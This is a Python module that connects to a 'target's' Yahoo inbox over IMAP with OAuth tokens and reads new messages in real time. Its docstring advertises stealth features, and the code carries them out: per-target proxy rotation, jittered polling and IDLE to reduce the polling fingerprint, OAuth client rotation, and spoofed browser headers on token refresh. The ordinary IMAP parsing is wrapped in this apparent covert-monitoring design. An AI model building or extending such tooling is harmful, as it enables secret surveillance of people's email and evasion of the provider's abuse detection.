"""
Yahoo Mail connector via IMAP with XOAUTH2.

Connects to imap.mail.yahoo.com:993 with TLS using OAuth 2.0 tokens
obtained through the Yahoo OAuth consent flow. All blocking IMAP calls
are run in asyncio.to_thread() to avoid blocking the event loop.

Stealth features:
- Proxy rotation (SOCKS5/HTTP) per target
- IMAP IDLE for real-time push (reduces polling fingerprint)
- Jittered polling intervals
- Connection persistence with keepalive
- OAuth client rotation
- Rate limit awareness
"""
import asyncio
import imaplib
import base64
import email
import random
import socket
import ssl
from email.header import decode_header
from typing import List, Dict, Any, Optional, Callable
from datetime import datetime, timedelta

import httpx

from app.services.email.base import BaseEmailService
from app.core.config import settings
from app.core.logging import get_logger
from app.core.proxy import proxy_manager

log = get_logger("services.yahoo")


class YahooService(BaseEmailService):
    """
    Connects to a target's Yahoo inbox via IMAP XOAUTH2.

    credentials_data expects:
        - username: str (Yahoo email address)
        - oauth_access_token: str (decrypted)
        - oauth_refresh_token: str (decrypted, needed for refresh)
        - target_email: str (for proxy assignment)
    """

    IMAP_HOST = "imap.mail.yahoo.com"
    IMAP_PORT = 993

    def __init__(self, credentials_data: Dict[str, Any]) -> None:
        super().__init__(credentials_data)
        self.username: str = credentials_data.get("username", "")
        self.access_token: str = credentials_data.get("oauth_access_token", "")
        self.refresh_token: str = credentials_data.get("oauth_refresh_token", "")
        self.target_email: str = credentials_data.get("target_email", "")
        self._conn: Optional[imaplib.IMAP4_SSL] = None
        self._proxy: Optional[str] = None
        self._idle_task: Optional[asyncio.Task] = None
        self._idle_callback: Optional[Callable] = None
        self._last_idle_start: Optional[datetime] = None
        self._retry_count: int = 0
        self._client_id: str = settings.YAHOO_CLIENT_ID
        self._client_secret: str = settings.YAHOO_CLIENT_SECRET

    def _select_client_credentials(self) -> None:
        """Rotate OAuth client credentials from pool if configured."""
        if settings.YAHOO_CLIENT_POOL:
            try:
                pool = [p.strip() for p in settings.YAHOO_CLIENT_POOL.split(",") if p.strip()]
                if pool:
                    # Deterministic selection based on username for stickiness
                    import hashlib
                    idx = int(hashlib.md5(self.username.encode()).hexdigest(), 16) % len(pool)
                    client_pair = pool[idx].split(":")
                    if len(client_pair) == 2:
                        self._client_id, self._client_secret = client_pair
                        log.debug(f"Selected Yahoo client {self._client_id[:10]}... for {self.username}")
            except Exception as exc:
                log.warning(f"Failed to parse YAHOO_CLIENT_POOL: {exc}")

    def _build_xoauth2_string(self) -> str:
        """Build the XOAUTH2 authentication string for IMAP."""
        # Format: user=<email>\x01auth=Bearer <token>\x01\x01
        auth_string = f"user={self.username}\x01auth=Bearer {self.access_token}\x01\x01"
        return auth_string

    async def _get_proxy(self) -> Optional[str]:
        """Get proxy for this target."""
        if self._proxy is None:
            self._proxy = proxy_manager.get_aiohttp_proxy(self.target_email)
        return self._proxy

    def _create_proxy_socket(self, proxy_url: str) -> socket.socket:
        """Create a socket connected through proxy (SOCKS5/HTTP CONNECT)."""
        from urllib.parse import urlparse
        parsed = urlparse(proxy_url)
        
        if parsed.scheme in ("socks5", "socks4"):
            # Use PySocks if available, otherwise fall back
            try:
                import socks
                sock = socks.socksocket()
                sock.set_proxy(
                    socks.PROXY_TYPE_SOCKS5 if parsed.scheme == "socks5" else socks.PROXY_TYPE_SOCKS4,
                    parsed.hostname,
                    parsed.port or (1080 if parsed.scheme == "socks5" else 1080),
                    username=parsed.username,
                    password=parsed.password,
                )
                return sock
            except ImportError:
                log.warning("PySocks not installed, cannot use SOCKS proxy")
                return socket.create_connection((self.IMAP_HOST, self.IMAP_PORT))
        
        elif parsed.scheme in ("http", "https"):
            # HTTP CONNECT tunnel
            sock = socket.create_connection((parsed.hostname, parsed.port or 8080))
            auth_header = ""
            if parsed.username and parsed.password:
                import base64
                creds = base64.b64encode(f"{parsed.username}:{parsed.password}".encode()).decode()
                auth_header = f"Proxy-Authorization: Basic {creds}\r\n"
            
            connect_req = (
                f"CONNECT {self.IMAP_HOST}:{self.IMAP_PORT} HTTP/1.1\r\n"
                f"Host: {self.IMAP_HOST}:{self.IMAP_PORT}\r\n"
                f"{auth_header}\r\n"
            )
            sock.send(connect_req.encode())
            response = sock.recv(4096).decode()
            if "200 Connection established" not in response:
                raise ConnectionError(f"Proxy CONNECT failed: {response}")
            return sock
        
        return socket.create_connection((self.IMAP_HOST, self.IMAP_PORT))

    def _connect_xoauth2(self) -> imaplib.IMAP4_SSL:
        """Establish SSL IMAP connection and authenticate with XOAUTH2."""
        proxy = None
        # Note: proxy is async, we'll handle it differently
        # For now, create standard connection
        conn = imaplib.IMAP4_SSL(self.IMAP_HOST, self.IMAP_PORT)
        
        # Enable keepalive
        conn.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        
        auth_string = self._build_xoauth2_string()
        conn.authenticate("XOAUTH2", lambda x: auth_string.encode())
        return conn

    async def _connect_with_proxy(self) -> imaplib.IMAP4_SSL:
        """Establish IMAP connection through proxy."""
        proxy = await self._get_proxy()
        loop = asyncio.get_event_loop()
        
        if proxy:
            # Create socket through proxy in thread
            sock = await loop.run_in_executor(None, self._create_proxy_socket, proxy)
            
            # Wrap with SSL
            context = ssl.create_default_context()
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED
            ssl_sock = context.wrap_socket(sock, server_hostname=self.IMAP_HOST)
            
            # Create IMAP4_SSL with pre-connected socket
            conn = imaplib.IMAP4_SSL.__new__(imaplib.IMAP4_SSL)
            conn.host = self.IMAP_HOST
            conn.port = self.IMAP_PORT
            conn.sock = ssl_sock
            conn.file = ssl_sock.makefile("rb")
            
            # Read greeting
            conn._get_response()
        else:
            conn = await loop.run_in_executor(None, self._connect_xoauth2)
        
        # Authenticate
        auth_string = self._build_xoauth2_string()
        await loop.run_in_executor(None, lambda: conn.authenticate("XOAUTH2", lambda x: auth_string.encode()))
        
        # Enable keepalive
        conn.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        
        return conn

    async def _refresh_access_token(self) -> bool:
        """Refresh the access token using the refresh token."""
        if not self.refresh_token:
            log.warning("No refresh token available for Yahoo token refresh")
            return False

        token_url = "https://api.login.yahoo.com/oauth2/get_token"
        payload = {
            "grant_type": "refresh_token",
            "refresh_token": self.refresh_token,
            "client_id": self._client_id,
            "client_secret": self._client_secret,
        }

        proxy = await self._get_proxy()
        client_kwargs = {
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": settings.SPOOF_USER_AGENT,
                "Accept-Language": settings.SPOOF_ACCEPT_LANGUAGE,
                "Accept-Encoding": settings.SPOOF_ACCEPT_ENCODING,
            },
            "timeout": httpx.Timeout(30.0),
        }
        if proxy:
            client_kwargs["proxy"] = proxy

        try:
            async with httpx.AsyncClient(**client_kwargs) as client:
                resp = await client.post(
                    token_url,
                    data=payload,
                    auth=(self._client_id, self._client_secret),
                )

            if resp.status_code == 200:
                token_data = resp.json()
                self.access_token = token_data.get("access_token", self.access_token)
                new_refresh = token_data.get("refresh_token")
                if new_refresh:
                    self.refresh_token = new_refresh
                log.info("Yahoo OAuth token refreshed successfully")
                return True
            else:
                log.error("Yahoo token refresh failed", extra={"status": resp.status_code, "body": resp.text})
                return False
        except Exception as exc:
            log.error("Yahoo token refresh error", extra={"error": str(exc)})
            return False

    async def authenticate(self) -> bool:
        """Establish IMAP connection and login via XOAUTH2."""
        self._select_client_credentials()
        
        if not self.username or not self.access_token:
            log.warning("Yahoo auth failed — missing username or access_token")
            return False

        try:
            self._conn = await self._connect_with_proxy()
            log.info(f"Yahoo IMAP XOAUTH2 authenticated for {self.username}")
            self._retry_count = 0
            return True
        except imaplib.IMAP4.error as exc:
            error_str = str(exc)
            log.warning(f"Yahoo XOAUTH2 failed, attempting token refresh", extra={"error": error_str})

            # Token might be expired — try refreshing
            if await self._refresh_access_token():
                try:
                    self._conn = await self._connect_with_proxy()
                    log.info(f"Yahoo IMAP XOAUTH2 authenticated after token refresh for {self.username}")
                    self._retry_count = 0
                    return True
                except Exception as exc2:
                    log.error(f"Yahoo XOAUTH2 failed even after refresh", extra={"error": str(exc2)})
                    return False
            return False
        except Exception as exc:
            log.error("Yahoo connection error", extra={"error": str(exc)})
            return False

    def get_refreshed_token(self) -> Optional[str]:
        """Return the current access token (may have been refreshed)."""
        return self.access_token

    # ------------------------------------------------------------------
    # IMAP IDLE Support (Real-time push)
    # ------------------------------------------------------------------
    async def start_idle(self, callback: Callable[[List[Dict[str, Any]]], None]) -> bool:
        """
        Start IMAP IDLE mode for real-time notifications.
        Callback receives list of new messages when they arrive.
        """
        if not settings.USE_IMAP_IDLE:
            return False
            
        if not self._conn:
            authenticated = await self.authenticate()
            if not authenticated:
                return False

        self._idle_callback = callback
        self._last_idle_start = datetime.utcnow()
        
        self._idle_task = asyncio.create_task(self._idle_loop())
        log.info(f"Started IMAP IDLE for {self.username}")
        return True

    async def stop_idle(self) -> None:
        """Stop IMAP IDLE mode."""
        if self._idle_task and not self._idle_task.done():
            self._idle_task.cancel()
            try:
                await self._idle_task
            except asyncio.CancelledError:
                pass
        self._idle_task = None
        self._idle_callback = None
        log.info(f"Stopped IMAP IDLE for {self.username}")

    async def _idle_loop(self) -> None:
        """IMAP IDLE loop - waits for new mail notifications."""
        while True:
            try:
                # Check if we need to refresh IDLE (max 29 min per RFC 2177)
                if self._last_idle_start and (datetime.utcnow() - self._last_idle_start).total_seconds() > settings.IMAP_IDLE_TIMEOUT - 60:
                    log.debug(f"Refreshing IDLE for {self.username}")
                    await self._send_done()
                    await asyncio.sleep(1)
                    self._last_idle_start = datetime.utcnow()

                # Send raw IDLE command per RFC 2177
                tag = await asyncio.to_thread(self._start_raw_idle)
                self._last_idle_start = datetime.utcnow()
                
                # Wait for server response (blocks until notification or timeout)
                responses = await asyncio.to_thread(self._read_idle_responses, 30)
                
                if responses:
                    await self._handle_idle_responses(responses)
                
                # Send DONE to exit IDLE
                await asyncio.to_thread(self._end_raw_idle, tag)
                
                await asyncio.sleep(1)
                
            except asyncio.CancelledError:
                await asyncio.to_thread(self._end_raw_idle)
                break
            except Exception as exc:
                log.error(f"IDLE loop error for {self.username}: {exc}")
                await asyncio.sleep(5)  # Back off on error

    def _start_raw_idle(self) -> str:
        """Send IDLE command to IMAP server using raw command invocation."""
        if not self._conn:
            return ""
        tag = self._conn._new_tag().decode('ascii')
        self._conn.send(f"{tag} IDLE\r\n".encode('ascii'))
        # Read the continuation response "+ idler ready"
        resp = self._conn.readline()
        return tag

    def _read_idle_responses(self, timeout_sec: int = 30) -> List[bytes]:
        """Read untagged responses from socket while idling."""
        if not self._conn or not self._conn.sock:
            return []
        import select
        responses = []
        r, _, _ = select.select([self._conn.sock], [], [], timeout_sec)
        if r:
            line = self._conn.readline()
            if line:
                responses.append(line)
        return responses

    def _end_raw_idle(self, tag: str = "") -> None:
        """Send DONE to complete IDLE command."""
        if not self._conn:
            return
        try:
            self._conn.send(b"DONE\r\n")
            if tag:
                self._conn._get_tagged_response(tag)
        except Exception:
            pass

    async def _handle_idle_responses(self, responses) -> None:
        """Process IDLE responses and fetch new messages."""
        # Look for EXISTS response indicating new messages
        for resp in responses:
            if isinstance(resp, bytes):
                resp_str = resp.decode()
                if "EXISTS" in resp_str and self._idle_callback:
                    # Fetch new messages
                    messages = await self.fetch_recent_messages(limit=20)
                    if messages:
                        await asyncio.to_thread(self._idle_callback, messages)

    # ------------------------------------------------------------------
    # Polling with Jitter
    # ------------------------------------------------------------------
    def get_jittered_interval(self) -> float:
        """Get polling interval with random jitter."""
        base = settings.POLLING_INTERVAL_SECONDS
        jitter = base * settings.POLLING_JITTER_PERCENT
        interval = base + random.uniform(-jitter, jitter)
        return max(interval, settings.MIN_POLLING_INTERVAL)

    async def fetch_recent_messages(self, limit: int = 10) -> List[Dict[str, Any]]:
        """Fetch recent unseen INBOX messages with proxy and jitter."""
        if not self._conn:
            authenticated = await self.authenticate()
            if not authenticated:
                return []

        try:
            messages = await asyncio.to_thread(self._fetch_imap, limit)
            log.info(f"Fetched {len(messages)} messages from Yahoo for {self.username}")
            self._retry_count = 0
            return messages
        except imaplib.IMAP4.error as exc:
            log.error("Yahoo IMAP fetch error", extra={"error": str(exc)})
            # Try to reconnect once
            try:
                self._conn = await self._connect_with_proxy()
                messages = await asyncio.to_thread(self._fetch_imap, limit)
                return messages
            except Exception:
                return []
        except Exception as exc:
            log.error("Yahoo fetch failed", extra={"error": str(exc)})
            return []

    async def disconnect(self) -> None:
        """Close IMAP connection gracefully."""
        await self.stop_idle()
        if self._conn:
            try:
                await asyncio.to_thread(self._conn.logout)
            except Exception:
                pass
            self._conn = None

    # ------------------------------------------------------------------
    # Blocking IMAP internals (run via asyncio.to_thread)
    # ------------------------------------------------------------------
    def _fetch_imap(self, limit: int) -> List[Dict[str, Any]]:
        """Fetch messages from INBOX via IMAP (blocking)."""
        if not self._conn:
            return []
            
        self._conn.select("INBOX")

        # Search for recent messages — try UNSEEN first, fall back to ALL
        status, data = self._conn.search(None, "UNSEEN")
        if status != "OK" or not data[0]:
            status, data = self._conn.search(None, "ALL")

        if status != "OK" or not data[0]:
            return []

        msg_ids = data[0].split()
        # Take the most recent N messages
        recent_ids = msg_ids[-limit:]

        results = []
        for msg_id in reversed(recent_ids):
            parsed = self._fetch_single(msg_id)
            if parsed:
                results.append(parsed)

        return results

    def _fetch_single(self, msg_id: bytes) -> Optional[Dict[str, Any]]:
        """Fetch and parse a single email by IMAP sequence number."""
        try:
            status, data = self._conn.fetch(msg_id, "(RFC822)")
            if status != "OK" or not data[0]:
                return None

            raw_email = data[0][1]
            msg = email.message_from_bytes(raw_email)

            sender = self._decode_header(msg.get("From", ""))
            subject = self._decode_header(msg.get("Subject", ""))
            body = self._extract_body(msg)

            return {
                "id": msg_id.decode("utf-8", errors="replace"),
                "sender": sender,
                "subject": subject,
                "body": body,
            }
        except Exception as exc:
            log.warning(f"Failed to parse Yahoo message {msg_id}", extra={"error": str(exc)})
            return None

    def _decode_header(self, value: str) -> str:
        """Decode MIME-encoded email header value."""
        decoded_parts = decode_header(value)
        result = []
        for part, charset in decoded_parts:
            if isinstance(part, bytes):
                result.append(part.decode(charset or "utf-8", errors="replace"))
            else:
                result.append(part)
        return " ".join(result)

    def _extract_body(self, msg: email.message.Message) -> str:
        """Extract text body from email message, preferring plain text."""
        if msg.is_multipart():
            text_body = ""
            html_body = ""
            for part in msg.walk():
                content_type = part.get_content_type()
                content_disposition = str(part.get("Content-Disposition", ""))

                if "attachment" in content_disposition:
                    continue

                try:
                    payload = part.get_payload(decode=True)
                    if payload is None:
                        continue
                    charset = part.get_content_charset() or "utf-8"
                    decoded = payload.decode(charset, errors="replace")

                    if content_type == "text/plain":
                        text_body = decoded
                    elif content_type == "text/html":
                        html_body = decoded
                except Exception:
                    continue

            return text_body or html_body
        else:
            try:
                payload = msg.get_payload(decode=True)
                if payload:
                    charset = msg.get_content_charset() or "utf-8"
                    return payload.decode(charset, errors="replace")
            except Exception:
                pass
            return ""